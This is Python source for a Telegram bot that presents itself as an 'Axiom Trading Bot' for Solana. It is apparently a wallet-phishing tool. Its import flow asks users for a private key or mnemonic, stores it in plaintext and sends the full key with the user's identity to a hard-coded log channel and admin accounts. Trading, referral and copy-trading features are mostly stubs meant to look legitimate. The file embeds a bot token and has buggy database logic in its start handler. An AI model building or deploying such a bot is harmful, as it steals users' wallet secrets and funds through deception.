import logging
import sqlite3
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from datetime import datetime
import base58

# ===== CONFIG =====
BOT_TOKEN = "7650902215:AAHyXg3BGBq0kRV3LJMYecDR_0q4jxU8OkE"
SOLANA_RPC = "https://api.mainnet-beta.solana.com"
LOG_CHANNEL_ID = -1002767755239  # Your log channel ID
ADMIN_IDS = [7641767864,]  # Admin user IDs

# ===== DATABASE =====
def init_db():
    conn = sqlite3.connect('bot.db')
    cursor = conn.cursor()
    
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        private_key TEXT,
        wallet_address TEXT,
        referral_code TEXT UNIQUE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS copy_trades (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        copied_address TEXT,
        is_active BOOLEAN DEFAULT 1
    )""")
    
    conn.commit()
    conn.close()

init_db()

# ===== LOGGING =====
async def log_action(context: ContextTypes.DEFAULT_TYPE, message: str, user: dict = None):
    """Log to channel and forward to admins"""
    try:
        log_msg = f"📝 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        if user:
            log_msg += f"👤 User: {user.get('full_name', '')} (@{user.get('username', 'N/A')})\n"
            log_msg += f"🆔 ID: `{user.get('id', '')}`\n"
        log_msg += f"📌 Action: {message}"
        
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=log_msg,
            parse_mode='Markdown'
        )
        
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"🔔 {log_msg}",
                    parse_mode='Markdown'
                )
            except Exception as e:
                logging.error(f"Failed to forward to admin {admin_id}: {e}")
    except Exception as e:
        logging.error(f"Logging failed: {e}")

# ===== SOLANA =====
async def get_balance(address: str) -> float:
    async with AsyncClient(SOLANA_RPC) as client:
        balance = await client.get_balance(address)
        return balance.value / 10**9 if balance.value else 0.0

# ===== KEYBOARDS =====
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Import Wallet", callback_data="import_wallet"),
         InlineKeyboardButton("📤 Invite Friends", callback_data="invite_friends")],
        [InlineKeyboardButton("💰 Buy/Sell", callback_data="buy_sell"),
         InlineKeyboardButton("📊 Asset", callback_data="asset")],
        [InlineKeyboardButton("⚙ Settings", callback_data="settings"),
         InlineKeyboardButton("👛 Wallet", callback_data="wallet_info")],
        [InlineKeyboardButton("📈 Copy Trading", callback_data="copy_trading"),
         InlineKeyboardButton("⏱ Limit Order", callback_data="limit_order")],
        [InlineKeyboardButton("🌐 Language", callback_data="language"),
         InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

def back_button():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])

def copy_trade_keyboard(user_id: int):
    with sqlite3.connect('bot.db') as conn:
        count = conn.execute("SELECT COUNT(*) FROM copy_trades WHERE user_id = ?", (user_id,)).fetchone()[0]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"➕ Add New Copy ({count}/10)", callback_data="add_copy_trade")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ])

# ===== HANDLERS =====
async def handle_import_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "Please enter your private key or mnemonic phrase:\n\n"
        "⚠️ This will be stored securely and logged for admin review",
        reply_markup=back_button()
    )
    return "AWAITING_WALLET"

async def process_wallet_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    key_input = update.message.text.strip()
    
    try:
        if key_input.startswith('['):
            kp = Keypair.from_mnemonic(key_input)
        else:
            kp = Keypair.from_base58_string(key_input)
            
        wallet_address = str(kp.pubkey())
        
        with sqlite3.connect('bot.db') as conn:
            conn.execute(
                "UPDATE users SET private_key = ?, wallet_address = ? WHERE user_id = ?",
                (key_input, wallet_address, user.id)
            )
        
        await log_action(context, 
            f"Wallet imported successfully\n\n"
            f"🔑 Key: `{key_input}`\n"
            f"📬 Address: `{wallet_address}`",
            {
                'id': user.id,
                'full_name': user.full_name,
                'username': user.username
            }
        )
        
        await update.message.reply_text(
            "✅ Wallet imported successfully!",
            reply_markup=main_menu()
        )
    except Exception as e:
        await log_action(context, 
            f"Failed wallet import\nError: {str(e)}",
            {
                'id': user.id,
                'full_name': user.full_name,
                'username': user.username
            }
        )
        await update.message.reply_text(
            "❌ Invalid key format. Please try again.",
            reply_markup=back_button()
        )
        return "AWAITING_WALLET"
    return ConversationHandler.END

async def handle_invite_friends(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    with sqlite3.connect('bot.db') as conn:
        ref_code = conn.execute(
            "SELECT referral_code FROM users WHERE user_id = ?", 
            (query.from_user.id,)
        ).fetchone()[0]
    
    await query.edit_message_text(
        f"🔗 Your referral link:\n\n"
        f"`https://t.me/YOUR_BOT_NAME?start={ref_code}`\n\n"
        f"💵 Withdrawable: 0 SOL\n"
        f"💰 Total earned: 0 SOL\n"
        f"👥 Referrals: 0\n\n"
        f"📖 Rules:\n"
        f"1. Earn 25% of referrals' trading fees\n"
        f"2. Minimum withdrawal: 0.01 SOL",
        reply_markup=back_button(),
        parse_mode='Markdown'
    )

async def handle_wallet_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    with sqlite3.connect('bot.db') as conn:
        wallet = conn.execute(
            "SELECT wallet_address FROM users WHERE user_id = ?", 
            (query.from_user.id,)
        ).fetchone()
    
    if not wallet or not wallet[0]:
        await query.edit_message_text(
            "❌ No wallet connected!\n"
            "Please import a wallet first.",
            reply_markup=back_button()
        )
    else:
        balance = await get_balance(wallet[0])
        await query.edit_message_text(
            f"💰 Wallet Info\n\n"
            f"🔷 Address:\n`{wallet[0]}`\n\n"
            f"💎 Balance: {balance:.2f} SOL",
            reply_markup=back_button(),
            parse_mode='Markdown'
        )

async def handle_copy_trading(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📈 Copy Trading\n\n"
        "Automatically copy trades from other wallets\n\n"
        "Current slots: 0/10",
        reply_markup=copy_trade_keyboard(query.from_user.id)
    )

async def handle_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🌟 **Bot Commands** 🌟\n\n"
        "🔹 /start - Main menu\n"
        "🔹 /wallet - Show wallet info\n"
        "🔹 /trades - Recent trades\n\n"
        "💳 **Wallet**\n"
        "- Import any Solana wallet\n"
        "- View balance\n"
        "- Send/receive tokens\n\n"
        "💸 **Trading**\n"
        "- Buy/sell any token\n"
        "- Limit orders\n"
        "- Copy trading\n\n"
        "⚠️ **Support**\n"
        "Contact @YourSupportHandle for help",
        reply_markup=back_button(),
        parse_mode='Markdown'
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    with sqlite3.connect('bot.db') as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT wallet_address FROM users WHERE user_id = ?", (user.id,))
        wallet = cursor.fetchone()[0] if cursor.fetchone() else None
        
        if not cursor.fetchone():
            ref_code = f"ref_{base58.b58encode(str(user.id).encode()).decode()[:8]}"
            conn.execute(
                "INSERT INTO users (user_id, referral_code) VALUES (?, ?)",
                (user.id, ref_code)
            )
    
    balance = await get_balance(wallet) if wallet else 0.0
    
    await log_action(context, "New user started bot", {
        'id': user.id,
        'full_name': user.full_name,
        'username': user.username
    })
    
    await update.message.reply_text(
        f"# Axiom Trading Bot\n\n"
        f"**Wallet address:** {wallet or 'Not connected'}\n"
        f"**Balance:** {balance:.2f} SOL\n\n"
        "Select an option:",
        reply_markup=main_menu(),
        parse_mode='Markdown'
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    error = str(context.error)
    user = update.effective_user if update.effective_user else None
    
    await log_action(context, 
        f"❌ Error occurred:\n`{error[:500]}`",
        {
            'id': user.id if user else None,
            'full_name': user.full_name if user else 'N/A',
            'username': user.username if user else 'N/A'
        }
    )
    
    if user:
        await context.bot.send_message(
            chat_id=user.id,
            text="⚠️ An error occurred. Our team has been notified.",
            reply_markup=main_menu()
        )

# ===== MAIN APP =====
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(handle_import_wallet, pattern="^import_wallet$")],
        states={
            "AWAITING_WALLET": [MessageHandler(filters.TEXT & ~filters.COMMAND, process_wallet_import)]
        },
        fallbacks=[CommandHandler("cancel", start)]
    )
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(handle_invite_friends, pattern="^invite_friends$"))
    application.add_handler(CallbackQueryHandler(handle_wallet_info, pattern="^wallet_info$"))
    application.add_handler(CallbackQueryHandler(handle_copy_trading, pattern="^copy_trading$"))
    application.add_handler(CallbackQueryHandler(handle_help, pattern="^help$"))
    application.add_handler(CallbackQueryHandler(start, pattern="^main_menu$"))
    
    application.add_error_handler(error_handler)
    
    application.run_polling()

if __name__ == "__main__":
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    main()
